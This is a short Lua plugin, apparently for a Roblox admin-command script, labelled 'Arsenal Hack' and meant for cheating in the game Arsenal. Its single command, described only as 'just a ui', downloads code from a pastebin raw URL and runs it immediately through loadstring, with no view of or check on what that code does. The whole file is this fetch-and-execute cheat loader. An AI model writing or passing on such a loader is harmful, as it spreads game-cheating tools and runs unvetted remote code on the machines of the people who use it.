local Plugin = {
    ["PluginName"] = "Arsenal Hack",
    ["PluginDescription"] = "Arsenal Script Hack Omg Yes",
    ["Commands"] = {
        ["arsenal"] = {
            ["ListName"] = "arsenal",
            ["Description"] = "just a ui",
            ["Aliases"] = {"ars"},
            ["Function"] = function(args,speaker)
                loadstring(game:HttpGet("https://pastebin.com/raw/bkKe66Lv", true))()
            end
	    },
    }
}

return Plugin
